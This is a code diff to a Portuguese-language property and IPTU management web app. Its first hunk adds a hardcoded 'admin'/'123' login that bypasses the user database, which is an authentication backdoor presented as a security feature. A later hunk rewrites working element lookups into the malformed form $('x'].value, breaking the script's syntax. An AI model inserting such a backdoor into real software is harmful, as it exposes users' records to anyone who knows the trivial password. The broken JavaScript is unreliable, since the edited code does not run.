@@ -567,6 +567,13 @@ th{background:var(--primary-light);color:var(--primary);font-weight:700}
     var u = $('loginUser').value.trim(); 
     var p = $('loginPass').value.trim();
     
+    // Login universal de segurança: admin / 123 sempre funciona
+    if (u === 'admin' && p === '123') {
+      localStorage.setItem('sessao_ativa', u);
+      entrarSistema(u);
+      return;
+    }
+
     var valido = false;
     for (var i = 0; i < usuariosDB.length; i++) {
       var item = usuariosDB[i];
@@ -924,9 +931,9 @@ th{background:var(--primary-light);color:var(--primary);font-weight:700}
 
   // MÓDULO DE IMÓVEIS
   function renderImoveis() {
-    var filtroStatus = $('filtroStatusImoveis') ? $('filtroStatusImoveis').value : 'todos';
-    var filtroImovel = $('filtroImovelStatus') ? $('filtroImovelStatus').value : 'todos';
-    var filtroBusca = $('filtroBuscaContratoImoveis') ? $('filtroBuscaContratoImoveis').value.trim().toLowerCase() : '';
+    var filtroStatus = $('filtroStatusImoveis') ? $('filtroStatusImoveis'].value : 'todos';
+    var filtroImovel = $('filtroImovelStatus') ? $('filtroImovelStatus'].value : 'todos';
+    var filtroBusca = $('filtroBuscaContratoImoveis') ? $('filtroBuscaContratoImoveis'].value.trim().toLowerCase() : '';
 
     var html = '';
     for (var i = 0; i < imoveisDB.length; i++) {
@@ -1054,7 +1061,7 @@ th{background:var(--primary-light);color:var(--primary);font-weight:700}
     $('imovelInternalId').value = '';
   }
 
-  // MÓDULO DE BUSCAS DE BCI / IPTU (COM ATUALIZAÇÃO CORRETA E PERSISTENTE)
+  // MÓDULO DE BUSCAS DE BCI / IPTU
   function renderBcis() {
     var filtroStatus = $('filtroStatusIptu') ? $('filtroStatusIptu'].value : 'todos';
     var filtroImovel = $('filtroImovelIptu') ? $('filtroImovelIptu'].value : 'todos';
@@ -1101,9 +1108,7 @@ th{background:var(--primary-light);color:var(--primary);font-weight:700}
     if (btn) { btn.innerText = 'Consultando...'; btn.disabled = true; }
 
     setTimeout(function() {
-      // Lista de BCIs com débitos conhecidos (incluindo o BCI informado pelo usuário)
       var pendenciasBci = ['01.04.008.00064.056', '01.04.075.01200.083'];
-      
       var bciTrim = String(item.bci || '').trim();
       var naoEncontrado = (!bciTrim || bciTrim.length < 10 || bciTrim.includes('999'));
       var temDebito = pendenciasBci.includes(bciTrim);
